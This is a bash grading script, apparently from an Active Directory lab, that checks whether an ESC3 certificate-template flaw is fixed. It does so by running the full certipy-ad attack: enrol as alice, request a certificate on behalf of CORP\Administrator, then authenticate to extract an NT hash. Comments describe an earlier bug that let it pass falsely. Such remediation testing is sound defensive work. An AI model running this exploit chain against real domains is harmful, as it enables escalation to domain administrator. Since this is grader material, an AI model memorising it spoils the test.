#!/usr/bin/env bash
# meta4/ad-vm/scenario-09/verify-poc.sh
# PASS (exit 0) iff alice cannot abuse the ESC3 Enrollment Agent template
# to request a cert on behalf of CORP\Administrator.

set -uo pipefail

# Tool preflight. /usr/bin/certipy-ad did not exist on the attacker: the
# provisioner pip-installed certipy-ad, whose console script is named
# `certipy`, then guarded its symlink on the filename `certipy-ad` -- so the
# link was silently skipped, and both fail-open branches below fired on every
# run. This scenario reported PASS on a fully vulnerable box.
# A missing grader dependency is a harness error, never a pass.
if [ ! -x /usr/bin/certipy-ad ]; then
    echo "[verify-poc-09] HARNESS ERROR: /usr/bin/certipy-ad missing or not executable" >&2
    exit 2
fi

cd "$(mktemp -d)" || { echo "[verify-poc-09] HARNESS ERROR: mktemp failed" >&2; exit 2; }

# Step 1: alice enrols in ESC3-Agent (the EKU=Certificate Request Agent template).
AGENT=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'ESC3-Agent' 2>&1 || true)
echo "--- agent enrol ---"; echo "$AGENT"

if [ ! -f alice.pfx ]; then
    if echo "$AGENT" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll'; then
        echo "[verify-poc-09] alice cannot enrol in ESC3-Agent -- BLOCKED"
        exit 0
    fi
    echo "[verify-poc-09] no agent PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    echo "[verify-poc-09] enrollment failing for an unknown reason is not evidence of remediation" >&2
    exit 1
fi

# Step 2: use the agent cert to request a cert ON BEHALF OF Administrator.
ONBEHALF=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'ESC3-User' \
    -on-behalf-of 'CORP\Administrator' \
    -pfx alice.pfx 2>&1 || true)
echo "--- on-behalf-of req ---"; echo "$ONBEHALF"

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth -pfx administrator.pfx -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- auth ---"; echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-09] ESC3 still exploitable -- agent + on-behalf-of -> NT hash" >&2
        exit 1
    fi
fi

if echo "$ONBEHALF" | grep -qiE 'access_denied|enrollment.*denied|invalid.*signature'; then
    echo "[verify-poc-09] on-behalf-of issuance denied -- BLOCKED"
    exit 0
fi
# An enrollment-agent certificate WAS issued to alice (we only reach here if
# alice.pfx exists). That alone is the ESC3 precondition, so an unexplained
# failure at the on-behalf-of step is not evidence the template was fixed.
echo "[verify-poc-09] alice holds an enrollment-agent cert but the on-behalf-of step gave no clear result" >&2
echo "[verify-poc-09] INCONCLUSIVE, grading FAIL - the ESC3 precondition is still present" >&2
exit 1
